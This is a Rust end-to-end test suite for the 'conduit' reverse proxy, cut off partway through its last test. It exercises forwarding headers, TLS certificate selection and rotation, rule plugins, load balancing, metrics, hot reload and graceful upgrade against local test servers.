//! Runs the real binary against local upstreams and checks behavior over the wire.

use std::collections::{BTreeSet, HashMap};
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicU8, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use openssl::asn1::Asn1Time;
use openssl::bn::{BigNum, MsbOption};
use openssl::ec::{EcGroup, EcKey};
use openssl::hash::MessageDigest;
use openssl::nid::Nid;
use openssl::pkey::{PKey, Private};
use openssl::ssl::{SslConnector, SslMethod, SslSession, SslStream, SslVerifyMode, SslVersion};
use openssl::x509::extension::{
    BasicConstraints, ExtendedKeyUsage, KeyUsage, SubjectAlternativeName,
};
use openssl::x509::{X509, X509Builder, X509NameBuilder};

/// A port for conduit to listen on. Not from `bind(0)`: that port is released before conduit
/// binds it, sits in the kernel's ephemeral range (32768 and up) where the client sockets of
/// all tests running in parallel take their source ports, and `bind(0)` in another test can
/// return it again. Under the release build's connection rate another test's server ended
/// up on a port meant for this one. Ports here are below that range and handed out once per
/// process; the process ID spreads concurrent test runs apart.
fn free_port() -> u16 {
    static NEXT: std::sync::atomic::AtomicU16 = std::sync::atomic::AtomicU16::new(0);
    let base = 10_000 + (std::process::id() % 20) as u16 * 1_000;
    loop {
        let port = base + NEXT.fetch_add(1, Ordering::Relaxed) % 1_000;
        if TcpListener::bind(("127.0.0.1", port)).is_ok() {
            return port;
        }
    }
}

fn self_signed(dir: &Path, name: &str, names: &[&str]) -> (PathBuf, PathBuf) {
    let group = EcGroup::from_curve_name(Nid::X9_62_PRIME256V1).unwrap();
    let key = PKey::from_ec_key(EcKey::generate(&group).unwrap()).unwrap();
    let mut subject = X509NameBuilder::new().unwrap();
    subject
        .append_entry_by_nid(Nid::COMMONNAME, names[0])
        .unwrap();
    let subject = subject.build();
    let mut b = X509Builder::new().unwrap();
    b.set_version(2).unwrap();
    let mut serial = BigNum::new().unwrap();
    serial.rand(64, MsbOption::MAYBE_ZERO, false).unwrap();
    b.set_serial_number(&serial.to_asn1_integer().unwrap())
        .unwrap();
    b.set_subject_name(&subject).unwrap();
    b.set_issuer_name(&subject).unwrap();
    b.set_pubkey(&key).unwrap();
    b.set_not_before(&Asn1Time::days_from_now(0).unwrap())
        .unwrap();
    b.set_not_after(&Asn1Time::days_from_now(30).unwrap())
        .unwrap();
    let mut san = SubjectAlternativeName::new();
    for n in names {
        san.dns(n);
    }
    let ext = san.build(&b.x509v3_context(None, None)).unwrap();
    b.append_extension(ext).unwrap();
    b.sign(&key, MessageDigest::sha256()).unwrap();
    let (c, k) = (
        dir.join(format!("{name}.crt")),
        dir.join(format!("{name}.key")),
    );
    std::fs::write(&c, b.build().to_pem().unwrap()).unwrap();
    std::fs::write(&k, key.private_key_to_pem_pkcs8().unwrap()).unwrap();
    (c, k)
}

/// HTTP/1.1 keep-alive upstream that answers with the request head it received, and names
/// itself in `X-Backend`.
fn echo_upstream() -> (u16, Arc<AtomicUsize>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let accepted = Arc::new(AtomicUsize::new(0));
    let counter = accepted.clone();
    thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            counter.fetch_add(1, Ordering::SeqCst);
            thread::spawn(move || serve_echo(stream, port));
        }
    });
    (port, accepted)
}

fn serve_echo(mut stream: TcpStream, port: u16) {
    let mut reader = BufReader::new(stream.try_clone().unwrap());
    loop {
        let mut head = String::new();
        loop {
            let mut line = String::new();
            if reader.read_line(&mut line).unwrap_or(0) == 0 {
                return;
            }
            if line == "\r\n" {
                break;
            }
            head.push_str(&line);
        }
        let len = head
            .lines()
            .find_map(|l| {
                l.to_ascii_lowercase()
                    .strip_prefix("content-length:")
                    .map(|v| v.trim().parse().unwrap_or(0))
            })
            .unwrap_or(0usize);
        let mut body = vec![0; len];
        if reader.read_exact(&mut body).is_err() {
            return;
        }
        // The head lowercased, then the body as received.
        let mut echo = head.to_ascii_lowercase();
        echo.push_str(&String::from_utf8_lossy(&body));
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nServer: echo-upstream\r\nX-Backend: {port}\r\nContent-Length: {}\r\n\r\n{echo}",
            echo.len()
        );
        if stream.write_all(resp.as_bytes()).is_err() {
            return;
        }
    }
}

#[derive(Debug)]
struct Resp {
    status: u16,
    headers: Vec<(String, String)>,
    body: String,
}

impl Resp {
    fn header(&self, name: &str) -> Option<&str> {
        self.headers
            .iter()
            .find(|(k, _)| k.eq_ignore_ascii_case(name))
            .map(|(_, v)| v.as_str())
    }
}

fn parse(raw: &[u8]) -> Resp {
    let text = String::from_utf8_lossy(raw);
    let (head, body) = text.split_once("\r\n\r\n").unwrap_or((&text, ""));
    let mut lines = head.lines();
    let status = lines
        .next()
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|s| s.parse().ok())
        .unwrap_or(0);
    let headers = lines
        .filter_map(|l| l.split_once(':'))
        .map(|(k, v)| (k.trim().to_string(), v.trim().to_string()))
        .collect();
    Resp {
        status,
        headers,
        body: body.to_string(),
    }
}

fn request(path: &str, host: &str, extra: &[(&str, &str)]) -> String {
    let mut r = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n");
    for (k, v) in extra {
        r.push_str(&format!("{k}: {v}\r\n"));
    }
    r.push_str("\r\n");
    r
}

fn read_all(s: &mut impl Read) -> Vec<u8> {
    let mut out = Vec::new();
    let mut buf = [0u8; 8192];
    loop {
        match s.read(&mut buf) {
            Ok(0) | Err(_) => return out,
            Ok(n) => out.extend_from_slice(&buf[..n]),
        }
    }
}

fn http(port: u16, host: &str, path: &str, extra: &[(&str, &str)]) -> Resp {
    let mut s = TcpStream::connect(("127.0.0.1", port)).unwrap();
    s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    s.write_all(request(path, host, extra).as_bytes()).unwrap();
    parse(&read_all(&mut s))
}

/// A completed TLS handshake and the DNS names of the certificate the server presented.
fn tls_connect(port: u16, sni: &str) -> Result<(SslStream<TcpStream>, Vec<String>), String> {
    let mut b = SslConnector::builder(SslMethod::tls()).unwrap();
    b.set_verify(SslVerifyMode::NONE);
    let connector = b.build();
    let tcp = TcpStream::connect(("127.0.0.1", port)).unwrap();
    tcp.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    let s = connector
        .configure()
        .unwrap()
        .verify_hostname(false)
        .connect(sni, tcp)
        .map_err(|e| e.to_string())?;
    let names = s
        .ssl()
        .peer_certificate()
        .and_then(|c| c.subject_alt_names())
        .map(|sans| {
            sans.iter()
                .filter_map(|n| n.dnsname().map(String::from))
                .collect()
        })
        .unwrap_or_default();
    Ok((s, names))
}

/// Returns the response and the DNS names of the certificate the server presented.
fn https(port: u16, sni: &str, path: &str) -> Result<(Resp, Vec<String>), String> {
    let (mut s, names) = tls_connect(port, sni)?;
    s.write_all(request(path, sni, &[]).as_bytes()).unwrap();
    Ok((parse(&read_all(&mut s)), names))
}

/// The value of the first sample of `name` whose labels include all of `labels`.
fn metric(text: &str, name: &str, labels: &[&str]) -> Option<f64> {
    text.lines()
        .filter(|l| l.starts_with(name) && l[name.len()..].starts_with(['{', ' ']))
        .find(|l| labels.iter().all(|want| l.contains(want)))
        .and_then(|l| l.rsplit(' ').next())
        .and_then(|v| v.parse().ok())
}

fn status_json(admin: u16) -> serde_json::Value {
    let r = http(admin, "localhost", "/status", &[]);
    assert_eq!(r.status, 200, "{r:?}");
    serde_json::from_str(&r.body).unwrap()
}

/// `/status` health of one backend of a pool.
fn backend_state(admin: u16, pool: &str, addr: &str) -> serde_json::Value {
    let s = status_json(admin);
    s["upstreams"]
        .as_array()
        .unwrap()
        .iter()
        .find(|p| p["name"] == pool)
        .and_then(|p| {
            p["backends"]
                .as_array()
                .unwrap()
                .iter()
                .find(|b| b["address"] == addr)
                .cloned()
        })
        .unwrap_or_else(|| panic!("no backend {addr} in pool {pool}: {s}"))
}

struct Proxy {
    child: Child,
    dir: PathBuf,
}

impl Drop for Proxy {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
        if !thread::panicking() {
            let _ = std::fs::remove_dir_all(&self.dir);
        }
    }
}

fn test_dir(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("conduit-e2e-{name}-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

fn spawn(cfg_path: &Path, extra: &[&str], stderr: &str) -> Child {
    let stderr = std::fs::File::create(cfg_path.with_file_name(stderr)).unwrap();
    Command::new(env!("CARGO_BIN_EXE_conduit"))
        .args(["run", "-c"])
        .arg(cfg_path)
        .args(extra)
        .stdout(Stdio::null())
        .stderr(stderr)
        .spawn()
        .unwrap()
}

fn signal(pid: u32, sig: &str) {
    let ok = Command::new("kill")
        .args([sig, &pid.to_string()])
        .status()
        .unwrap()
        .success();
    assert!(ok, "kill {sig} {pid}");
}

fn wait_for_port(port: u16) {
    let deadline = Instant::now() + Duration::from_secs(15);
    while TcpStream::connect(("127.0.0.1", port)).is_err() {
        assert!(
            Instant::now() < deadline,
            "conduit did not start listening on {port}"
        );
        thread::sleep(Duration::from_millis(50));
    }
}

fn wait_until(what: &str, timeout: Duration, mut ok: impl FnMut() -> bool) {
    let deadline = Instant::now() + timeout;
    while !ok() {
        assert!(Instant::now() < deadline, "timed out waiting for {what}");
        thread::sleep(Duration::from_millis(100));
    }
}

struct Ports {
    http: u16,
    https: u16,
    admin: u16,
    /// Echo upstream used by most sites.
    upstream: u16,
    /// Connections it accepted.
    accepted: Arc<AtomicUsize>,
    /// Second echo upstream, in the `lb` pool.
    upstream2: u16,
    /// Nothing listens here.
    dead: u16,
}

impl Ports {
    fn new() -> Ports {
        let (upstream, accepted) = echo_upstream();
        Ports {
            http: free_port(),
            https: free_port(),
            admin: free_port(),
            upstream,
            accepted,
            upstream2: echo_upstream().0,
            dead: free_port(),
        }
    }
}

fn config(dir: &Path, p: &Ports) -> String {
    let (wc, wk) = self_signed(dir, "wild", &["*.example.test", "example.test"]);
    let (ec, ek) = self_signed(dir, "exact", &["secure.example.test"]);
    format!(
        r#"
server:
  threads: 1
  shutdown_grace: 1s
  pid_file: {dir}/conduit.pid
  upgrade_sock: {dir}/upgrade.sock
listen:
  http: ["127.0.0.1:{http}"]
  https: ["127.0.0.1:{https}"]
admin:
  listen: "127.0.0.1:{admin}"
access_log:
  path: {dir}/logs/access.log
real_ip:
  header: X-Real-IP
  trusted: ["127.0.0.1/32"]
tls:
  watch_interval: 1s
  certs:
    - {{ name: wild, cert: {wc}, key: {wk} }}
    - {{ name: exact, cert: {ec}, key: {ek} }}
upstreams:
  lb:
    backends:
      - http://127.0.0.1:{up}
      - http://127.0.0.1:{up2}
      - http://127.0.0.1:{dead}
    retries: 1
    health_check: {{ path: /health, interval: 300ms, timeout: 300ms, rise: 1, fall: 1 }}
sites:
  - id: "1"
    hosts: [app.example.test]
    upstream: http://127.0.0.1:{up}
  - id: "2"
    hosts: [secure.example.test]
    upstream: http://127.0.0.1:{up}
    force_https: true
  - id: "3"
    hosts: [pb.example.test]
    upstream: http://127.0.0.1:{up}
    plugins:
      - ip_filter: {{ deny: [203.0.113.0/24] }}
      - headers:
          request: {{ set: {{ X-Env: e2e }} }}
          response: {{ set: {{ Access-Control-Allow-Origin: "*" }}, remove: [Server] }}
      - rules:
          - match: {{ path: {{ regex: "(?i)^/_(/|$)" }} }}
            action: {{ deny: 403 }}
  - id: "5"
    hosts: [dead.example.test]
    upstream: http://127.0.0.1:{dead}
    plugins:
      - headers: {{ response: {{ set: {{ Access-Control-Allow-Origin: "*" }} }} }}
  - id: lb
    hosts: [lb.example.test]
    upstream: lb
  - id: retry
    hosts: [retry.example.test]
    upstream:
      backends: [http://127.0.0.1:{up}, http://127.0.0.1:{dead}]
      passive: {{ failures: 2, eject: 60s }}
"#,
        dir = dir.display(),
        http = p.http,
        https = p.https,
        admin = p.admin,
        up = p.upstream,
        up2 = p.upstream2,
        dead = p.dead,
        wc = wc.display(),
        wk = wk.display(),
        ec = ec.display(),
        ek = ek.display(),
    )
}

#[test]
fn end_to_end() {
    let dir = test_dir("main");
    let p = Ports::new();
    let (http_port, https_port, admin) = (p.http, p.https, p.admin);
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(&cfg_path, config(&dir, &p)).unwrap();
    let proxy = Proxy {
        child: spawn(&cfg_path, &[], "stderr.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    wait_for_port(https_port);
    wait_for_port(admin);

    // Proxied over HTTP with forwarding headers and a request id.
    let r = http(
        http_port,
        "app.example.test",
        "/hello?x=1",
        &[("User-Agent", "e2e-test")],
    );
    assert_eq!(r.status, 200, "{r:?}");
    assert!(r.body.starts_with("get /hello?x=1 http/1.1"), "{}", r.body);
    assert!(r.body.contains("x-forwarded-for: 127.0.0.1"), "{}", r.body);
    assert!(r.body.contains("x-real-ip: 127.0.0.1"), "{}", r.body);
    assert!(r.body.contains("x-forwarded-proto: http\r\n"), "{}", r.body);
    assert!(
        r.body.contains("x-forwarded-host: app.example.test\r\n"),
        "{}",
        r.body
    );
    assert!(r.body.contains("host: app.example.test\r\n"), "{}", r.body);
    assert!(!r.body.contains("x-forwarded-scheme"), "{}", r.body);
    assert_eq!(r.header("x-served-by"), None);
    // The default `Server` replaces the upstream's.
    assert_eq!(r.header("server"), Some("conduit"));
    let first_id = r.header("x-request-id").unwrap().to_string();
    assert_eq!(first_id.len(), 24, "{first_id}");
    assert!(
        r.body.contains(&format!("x-request-id: {first_id}\r\n")),
        "{}",
        r.body
    );

    // A trusted peer may name the client and the request id; the chain is extended.
    let r = http(
        http_port,
        "app.example.test",
        "/",
        &[
            ("X-Real-IP", "203.0.113.7"),
            ("X-Forwarded-For", "203.0.113.7"),
            ("X-Request-Id", "edge-42"),
        ],
    );
    assert!(r.body.contains("x-real-ip: 203.0.113.7"), "{}", r.body);
    assert!(
        r.body.contains("x-forwarded-for: 203.0.113.7, 203.0.113.7"),
        "{}",
        r.body
    );
    assert_eq!(r.header("x-request-id"), Some("edge-42"));

    // Upstream connections are pooled across client connections.
    let before = p.accepted.load(Ordering::SeqCst);
    for _ in 0..10 {
        assert_eq!(
            http(http_port, "app.example.test", "/pool", &[]).status,
            200
        );
    }
    let opened = p.accepted.load(Ordering::SeqCst) - before;
    assert!(
        opened <= 1,
        "10 requests opened {opened} upstream connections"
    );

    // HTTPS: exact SAN beats the wildcard; the wildcard covers the rest.
    let (r, names) = https(https_port, "secure.example.test", "/s").unwrap();
    assert_eq!(r.status, 200, "{r:?}");
    assert_eq!(names, vec!["secure.example.test"]);
    assert!(r.body.contains("x-forwarded-proto: https"), "{}", r.body);
    let (_, names) = https(https_port, "app.example.test", "/").unwrap();
    assert_eq!(names, vec!["*.example.test", "example.test"]);
    // No certificate and no default: the handshake is refused.
    assert!(https(https_port, "unknown.invalid", "/").is_err());

    // Force HTTPS, with a small HTML body.
    let r = http(http_port, "secure.example.test", "/a?b=c", &[]);
    assert_eq!(r.status, 301);
    assert_eq!(
        r.header("location"),
        Some("https://secure.example.test/a?b=c")
    );
    assert_eq!(r.header("content-type"), Some("text/html"));
    assert!(r.header("x-request-id").is_some());
    assert!(
        r.body.contains("<h1>301 Moved Permanently</h1>"),
        "{}",
        r.body
    );

    // Routing ignores case and port; the upstream gets the Host the client sent.
    let r = http(http_port, "APP.Example.test:8080", "/", &[]);
    assert_eq!(r.status, 200, "{r:?}");
    assert!(
        r.body.contains("host: app.example.test:8080\r\n"),
        "{}",
        r.body
    );

    // HTTP/2 clients send no Host header, only :authority.
    if let Ok(out) = Command::new("curl")
        .args([
            "-sk",
            "--http2",
            "-o",
            "-",
            "-w",
            "\n%{http_version}",
            "--resolve",
        ])
        .arg(format!("app.example.test:{https_port}:127.0.0.1"))
        .arg(format!("https://app.example.test:{https_port}/h2"))
        .output()
    {
        let text = String::from_utf8_lossy(&out.stdout);
        assert!(text.ends_with("\n2"), "not HTTP/2: {text}");
        assert!(text.starts_with("get /h2 http/1.1"), "{text}");
        assert!(
            text.contains(&format!("host: app.example.test:{https_port}\r\n")),
            "{text}"
        );
    }

    // Upstream down: 502 with a body and the site's plugin headers.
    let r = http(http_port, "dead.example.test", "/", &[]);
    assert_eq!(r.status, 502, "{r:?}");
    assert_eq!(r.header("content-type"), Some("text/html"));
    assert_eq!(r.header("access-control-allow-origin"), Some("*"));
    assert!(r.body.contains("502 Bad Gateway"), "{}", r.body);

    // Plugins: rules match the normalized path, so encodings do not bypass them; headers
    // apply to local and proxied responses; ip_filter sees the real client address.
    for path in ["/_/", "/%5F/", "//_", "/x/../_/admin"] {
        let r = http(http_port, "pb.example.test", path, &[]);
        assert_eq!(r.status, 403, "{path}");
        assert_eq!(r.header("access-control-allow-origin"), Some("*"), "{path}");
    }
    let r = http(http_port, "pb.example.test", "/api/health", &[]);
    assert_eq!(r.status, 200);
    assert_eq!(r.header("access-control-allow-origin"), Some("*"));
    assert_eq!(r.header("server"), None);
    assert!(r.body.contains("x-env: e2e\r\n"), "{}", r.body);
    let r = http(
        http_port,
        "pb.example.test",
        "/api/health",
        &[("X-Real-IP", "203.0.113.50")],
    );
    assert_eq!(r.status, 403, "{r:?}");
    assert_eq!(http(http_port, "nope.example.org", "/", &[]).status, 404);

    // Load balancing: the dead backend is skipped by retrying the request elsewhere at
    // first, then by its failed health check; both live backends take traffic.
    let dead = format!("127.0.0.1:{}", p.dead);
    let mut served: HashMap<String, usize> = HashMap::new();
    for _ in 0..30 {
        let r = http(http_port, "lb.example.test", "/", &[]);
        assert_eq!(r.status, 200, "{r:?}");
        *served
            .entry(r.header("x-backend").unwrap().to_string())
            .or_default() += 1;
    }
    assert_eq!(served.len(), 2, "{served:?}");
    wait_until(
        "health check marks the dead backend",
        Duration::from_secs(5),
        || backend_state(admin, "lb", &dead)["healthy"] == false,
    );
    assert_eq!(
        backend_state(admin, "lb", &format!("127.0.0.1:{}", p.upstream))["healthy"],
        true
    );

    // Without active checks: a connect failure is retried on the other backend, and two in
    // a row eject the dead one.
    for _ in 0..8 {
        let r = http(http_port, "retry.example.test", "/", &[]);
        assert_eq!(r.status, 200, "{r:?}");
    }
    let state = backend_state(admin, "site:retry", &dead);
    assert_eq!(state["healthy"], true);
    assert_eq!(state["ejected"], true);

    // Admin endpoints.
    let r = http(admin, "localhost", "/healthz", &[]);
    assert_eq!((r.status, r.body.as_str()), (200, "ok\n"));
    let m = http(admin, "localhost", "/metrics", &[]).body;
    assert!(
        metric(
            &m,
            "conduit_requests_total",
            &[r#"site="1""#, r#"code="2xx""#]
        )
        .unwrap()
            >= 10.0,
        "{m}"
    );
    assert!(
        metric(
            &m,
            "conduit_requests_total",
            &[r#"site="5""#, r#"code="5xx""#]
        )
        .unwrap()
            >= 1.0
    );
    assert_eq!(
        metric(
            &m,
            "conduit_backend_up",
            &[r#"pool="lb""#, &format!(r#"backend="{dead}""#)]
        ),
        Some(0.0)
    );
    assert_eq!(
        metric(
            &m,
            "conduit_upstream_retries_total",
            &[r#"pool="site:retry""#]
        ),
        Some(2.0)
    );
    assert_eq!(
        metric(
            &m,
            "conduit_backend_failures_total",
            &[r#"pool="site:retry""#, &format!(r#"backend="{dead}""#)]
        ),
        Some(2.0)
    );
    assert!(
        metric(
            &m,
            "conduit_tls_certificate_expiry_timestamp_seconds",
            &[r#"name="wild""#]
        )
        .unwrap()
            > 1.7e9
    );
    assert!(
        metric(
            &m,
            "conduit_request_duration_seconds_count",
            &[r#"site="1""#]
        )
        .unwrap()
            >= 10.0
    );
    assert!(metric(&m, "process_resident_memory_bytes", &[]).unwrap() > 0.0);
    // One process collector, for the running process: prometheus registers its own on first
    // use of the default registry, before daemonizing, which conduit replaces.
    for name in ["process_resident_memory_bytes ", "process_open_fds "] {
        assert_eq!(m.lines().filter(|l| l.starts_with(name)).count(), 1, "{m}");
    }
    assert_eq!(http(admin, "localhost", "/nope", &[]).status, 404);

    // Hot reload: a new site appears after SIGHUP without dropping the listener, and the
    // unchanged pool keeps its health state.
    assert_eq!(http(http_port, "new.example.org", "/", &[]).status, 404);
    let extra = format!(
        "  - id: \"4\"\n    hosts: [new.example.org]\n    upstream: http://127.0.0.1:{}\n",
        p.upstream
    );
    let text = std::fs::read_to_string(&cfg_path).unwrap() + &extra;
    std::fs::write(&cfg_path, text).unwrap();
    let pid = proxy.child.id().to_string();
    signal(proxy.child.id(), "-HUP");
    wait_until(
        "reload picks up the new site",
        Duration::from_secs(10),
        || http(http_port, "new.example.org", "/", &[]).status == 200,
    );
    assert_eq!(backend_state(admin, "lb", &dead)["healthy"], false);
    // A broken config is rejected and the running one keeps serving.
    std::fs::write(&cfg_path, "sites: [ this is not valid").unwrap();
    signal(proxy.child.id(), "-HUP");
    wait_until(
        "the failed reload is reported",
        Duration::from_secs(5),
        || status_json(admin)["config"]["last_reload"]["ok"] == false,
    );
    assert_eq!(http(http_port, "new.example.org", "/", &[]).status, 200);

    // Access log: one JSON object per request with the timing breakdown.
    thread::sleep(Duration::from_millis(1500));
    let log = std::fs::read_to_string(dir.join("logs/access.log")).unwrap();
    let lines: Vec<serde_json::Value> = log
        .lines()
        .map(|l| serde_json::from_str(l).unwrap_or_else(|e| panic!("{e}: {l}")))
        .collect();
    assert!(lines.len() >= 40, "{log}");
    let first = &lines[0];
    assert_eq!(first["site"], "1");
    assert_eq!(first["uri"], "/hello?x=1");
    assert_eq!(first["status"], 200);
    assert_eq!(first["upstream_status"], 200);
    assert_eq!(first["upstream"], format!("127.0.0.1:{}", p.upstream));
    assert_eq!(first["request_id"], first_id.as_str());
    assert_eq!(first["client"], "127.0.0.1");
    assert_eq!(first["user_agent"], "e2e-test");
    assert!(first["duration_ms"].as_f64().unwrap() > 0.0);
    assert!(first["upstream_header_ms"].as_f64().is_some());
    assert!(
        lines
            .iter()
            .any(|l| l["host"] == "nope.example.org" && l["site"].is_null())
    );
    assert!(
        lines
            .iter()
            .any(|l| l["site"] == "retry" && l["retries"] == 1)
    );
    assert!(
        lines
            .iter()
            .any(|l| l["proto"] == "HTTP/2" && l["tls"].is_string())
    );
    assert!(
        lines
            .iter()
            .any(|l| l["status"] == 502 && l["error"].is_string())
    );

    // Report resident memory of the running proxy.
    let status = std::fs::read_to_string(format!("/proc/{pid}/status")).unwrap();
    let rss = status
        .lines()
        .find(|l| l.starts_with("VmRSS"))
        .unwrap_or("VmRSS: ?");
    eprintln!("conduit {rss}");
}

/// The message of a caught panic (a failed `unwrap` in a client helper names the I/O error).
fn panic_text(e: &(dyn std::any::Any + Send)) -> String {
    e.downcast_ref::<String>()
        .cloned()
        .or_else(|| e.downcast_ref::<&str>().map(|s| s.to_string()))
        .unwrap_or_else(|| "panic".to_string())
}

/// Distinct failures with their counts, most frequent first.
fn tally(failed: &[String]) -> Vec<(usize, &str)> {
    let mut counts = std::collections::HashMap::<&str, usize>::new();
    for f in failed {
        *counts.entry(f.as_str()).or_default() += 1;
    }
    let mut v: Vec<_> = counts.into_iter().map(|(f, n)| (n, f)).collect();
    v.sort_unstable_by(|a, b| b.cmp(a));
    v
}

/// SIGQUIT hands the listeners to a process started with `--upgrade`; clients see no errors.
#[test]
fn graceful_upgrade() {
    let dir = test_dir("upgrade");
    let p = Ports::new();
    let http_port = p.http;
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(&cfg_path, config(&dir, &p)).unwrap();
    let mut old = Proxy {
        child: spawn(&cfg_path, &[], "old.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);

    // Clients keep opening fresh connections for the whole handover.
    let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let load = {
        let stop = stop.clone();
        thread::spawn(move || {
            let (mut ok, mut failed) = (0, Vec::new());
            while !stop.load(Ordering::SeqCst) {
                let r = std::panic::catch_unwind(|| http(http_port, "app.example.test", "/", &[]));
                match r {
                    Ok(r) if r.status == 200 => ok += 1,
                    Ok(r) => failed.push(format!("status {}", r.status)),
                    Err(e) => failed.push(panic_text(&*e)),
                }
            }
            (ok, failed)
        })
    };

    let new = spawn(&cfg_path, &["--upgrade"], "new.log");
    let sock = dir.join("upgrade.sock");
    let deadline = Instant::now() + Duration::from_secs(4);
    while !sock.exists() {
        assert!(
            Instant::now() < deadline,
            "new process never opened the upgrade socket"
        );
        thread::sleep(Duration::from_millis(20));
    }
    signal(old.child.id(), "-QUIT");
    let status = wait_exit(&mut old.child, Duration::from_secs(20));
    assert!(status.success(), "old process exited with {status}");
    // The old process is gone: everything below is served by the new one.
    thread::sleep(Duration::from_millis(300));
    stop.store(true, Ordering::SeqCst);
    let (ok, failed) = load.join().unwrap();
    assert!(
        failed.is_empty(),
        "{} failures during upgrade: {:?}",
        failed.len(),
        tally(&failed)
    );
    assert!(ok > 50, "only {ok} requests completed");
    let (r, _) = https(p.https, "app.example.test", "/").unwrap();
    assert_eq!(r.status, 200);
    // The admin listener moved over too.
    assert_eq!(
        status_json(p.admin)["pid"],
        serde_json::json!(new.id()),
        "admin served by the old process"
    );
    eprintln!("upgrade: {ok} requests, 0 failures");

    // Keep the new process alive for cleanup via the Drop of a second guard.
    let _new = Proxy {
        child: new,
        dir: dir.clone(),
    };
    std::mem::forget(old);
}

/// Requests in a loop until `stop`, each on a fresh connection (a new TLS handshake for
/// HTTPS). Returns successes, failures, and the `rotated*` names seen in certificates.
fn load_until(
    stop: Arc<std::sync::atomic::AtomicBool>,
    tls: bool,
    port: u16,
) -> thread::JoinHandle<(usize, Vec<String>, BTreeSet<String>)> {
    thread::spawn(move || {
        let (mut ok, mut failed, mut seen) = (0, Vec::new(), BTreeSet::new());
        while !stop.load(Ordering::SeqCst) {
            let r = std::panic::catch_unwind(|| {
                if tls {
                    https(port, "app.example.test", "/")
                } else {
                    Ok((http(port, "app.example.test", "/", &[]), Vec::new()))
                }
            });
            match r {
                Ok(Ok((r, names))) if r.status == 200 => {
                    ok += 1;
                    seen.extend(names.into_iter().filter(|n| n.starts_with("rotated")));
                }
                Ok(Ok((r, _))) => failed.push(format!("status {}", r.status)),
                Ok(Err(e)) => failed.push(format!("handshake: {e}")),
                Err(_) => failed.push("connection error".to_string()),
            }
        }
        (ok, failed, seen)
    })
}

/// Names in the certificate served for app.example.test right now.
fn presented(port: u16) -> Vec<String> {
    tls_connect(port, "app.example.test").unwrap().1
}

#[test]
fn rotation_and_reload_under_load() {
    let dir = test_dir("rotate");
    let p = Ports::new();
    let (http_port, https_port, admin) = (p.http, p.https, p.admin);
    let cfg_path = dir.join("conduit.yaml");
    let cfg_text = config(&dir, &p);
    std::fs::write(&cfg_path, &cfg_text).unwrap();
    let proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    wait_for_port(https_port);

    let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let tls_load = load_until(stop.clone(), true, https_port);
    let plain_load = load_until(stop.clone(), false, http_port);
    // Handshaken before any rotation; must still serve a request afterwards.
    let (mut held, held_names) = tls_connect(https_port, "app.example.test").unwrap();
    thread::sleep(Duration::from_millis(300));

    let (wc, wk) = (dir.join("wild.crt"), dir.join("wild.key"));
    let wildcard = |tag: &str| {
        let host = format!("{tag}.example.test");
        self_signed(&dir, tag, &["*.example.test", "example.test", &host])
    };

    // 1. The way certbot renews: each live/ symlink is switched in turn, the key first,
    // so for a moment the new key sits next to the old certificate.
    let (c, k) = wildcard("rotated1");
    std::fs::rename(&k, &wk).unwrap();
    std::fs::rename(&c, &wc).unwrap();
    wait_until(
        "the certificate from rename",
        Duration::from_secs(10),
        || presented(https_port).contains(&"rotated1.example.test".to_string()),
    );

    // 2. Overwritten in place, the key well after the certificate: at least one reload
    // sees a certificate that does not match its key, must reject it, and keep serving.
    let (c, k) = wildcard("rotated2");
    std::fs::write(&wc, std::fs::read(&c).unwrap()).unwrap();
    thread::sleep(Duration::from_millis(1500)); // longer than tls.watch_interval
    assert!(
        presented(https_port).contains(&"rotated1.example.test".to_string()),
        "a certificate without its key went live"
    );
    std::fs::write(&wk, std::fs::read(&k).unwrap()).unwrap();
    wait_until(
        "the certificate written in place",
        Duration::from_secs(10),
        || presented(https_port).contains(&"rotated2.example.test".to_string()),
    );
    let m = http(admin, "localhost", "/metrics", &[]).body;
    let failures = metric(&m, "conduit_config_reloads_total", &["result=\"failure\""]);
    assert!(
        failures.unwrap_or(0.0) >= 1.0,
        "the mismatched pair was not rejected"
    );

    // 3. A configuration change, picked up from the file and by SIGHUP.
    let added = format!(
        "{cfg_text}  - id: added\n    hosts: [added.example.test]\n    upstream: http://127.0.0.1:{}\n",
        p.upstream
    );
    std::fs::write(&cfg_path, added).unwrap();
    signal(proxy.child.id(), "-HUP");
    wait_until("the added site", Duration::from_secs(10), || {
        http(http_port, "added.example.test", "/", &[]).status == 200
    });
    thread::sleep(Duration::from_millis(300));

    stop.store(true, Ordering::SeqCst);
    let (tls_ok, tls_failed, seen) = tls_load.join().unwrap();
    let (plain_ok, plain_failed, _) = plain_load.join().unwrap();
    assert!(
        tls_failed.is_empty() && plain_failed.is_empty(),
        "failures: https {tls_failed:?}, http {plain_failed:?}"
    );
    assert!(
        tls_ok > 20 && plain_ok > 50,
        "too little traffic: {tls_ok} https, {plain_ok} http"
    );
    assert!(
        seen.contains("rotated1.example.test") && seen.contains("rotated2.example.test"),
        "clients never saw both new certificates: {seen:?}"
    );

    // The connection made before both rotations still works, on its original certificate.
    assert!(!held_names.iter().any(|n| n.starts_with("rotated")));
    held.write_all(request("/", "app.example.test", &[]).as_bytes())
        .unwrap();
